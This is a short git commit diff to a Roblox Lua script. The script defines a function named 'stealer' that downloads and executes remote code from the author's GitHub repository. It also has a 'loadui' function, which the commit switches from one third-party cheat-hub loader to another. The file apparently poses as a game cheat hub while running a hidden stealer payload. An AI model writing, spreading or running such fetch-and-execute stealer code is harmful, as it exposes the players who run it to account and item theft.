84d36c63338e46fba8cb867d472ac8ec9d0a6c11
Seuj09 <138261033+Seuj09@users.noreply.github.com>
2025-08-18 15:13:53 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -2,8 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua'))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-
+  loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
 end
 
 task.spawn(stealer)
